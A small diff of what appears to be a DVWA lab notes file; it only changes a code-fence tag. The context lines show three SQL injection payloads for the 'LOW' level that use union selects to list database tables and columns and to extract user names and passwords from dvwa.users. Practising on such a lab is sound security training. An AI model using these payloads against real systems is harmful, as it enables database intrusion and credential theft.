@@ -1,5 +1,5 @@
 # LOW
-```SQL
+```sql
 %' or '0'='0' union select TABLE_NAME, COLUMN_NAME from information_schema.COLUMNS #
 %' or '0'='0' union select TABLE_NAME, COLUMN_NAME from information_schema.COLUMNS where TABLE_NAME = 'users' #
 %' or '0'='0' union select user, password from dvwa.users #
